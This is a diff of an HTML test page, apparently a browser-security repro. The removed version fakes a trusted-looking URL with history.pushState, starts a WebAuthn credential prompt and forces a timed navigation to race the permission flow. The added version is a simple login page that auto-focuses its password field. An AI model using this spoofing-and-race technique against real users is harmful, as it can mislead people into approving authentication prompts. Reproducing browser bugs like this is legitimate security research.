@@ -2,72 +2,26 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>WebAuthn Navigation Demo</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      margin: 0;
-      height: 100vh;
-    }
-    #panel {
-      display: none;
-      padding: 20px;
-      background: #eee;
-    }
-    #trigger {
-      margin: 40px;
-      padding: 12px 20px;
-      font-size: 16px;
-    }
-  </style>
+  <title>Login Page</title>
 </head>
 <body>
+  <h2>Login</h2>
 
-<button id="trigger">Continue</button>
-<div id="panel">Trusted panel</div>
+  <input type="text" placeholder="Username"><br><br>
+  <input type="password" placeholder="Password" id="pwd"><br><br>
 
-<script>
-const trigger = document.getElementById('trigger');
-const panel = document.getElementById('panel');
+  <button onclick="go()">Continue</button>
 
-/*
- * Step 1:
- * Manipulate visible URL to a trusted-looking path
- * + trigger WebAuthn
- */
-trigger.onclick = async () => {
-  history.pushState({}, '', '/trusted');
-  panel.style.display = 'block';
+  <script>
+    function go() {
+      // simulate user navigating while password field was active
+      window.location.href = "next.html";
+    }
 
-  try {
-    await navigator.credentials.get({
-      publicKey: {
-        challenge: new Uint8Array(32),
-        timeout: 60000,
-        userVerification: "required"
-      }
-    });
-  } catch (e) {
-    console.log(e);
-  }
-};
-
-/*
- * Step 2:
- * Trigger a navigation race shortly after permission flow starts
- */
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        location.href = 'https://google.com';
-      }, 4000);
-    });
-  });
-});
-</script>
-
+    // auto-focus password (allowed)
+    window.onload = () => {
+      document.getElementById("pwd").focus();
+    };
+  </script>
 </body>
 </html>
-
-
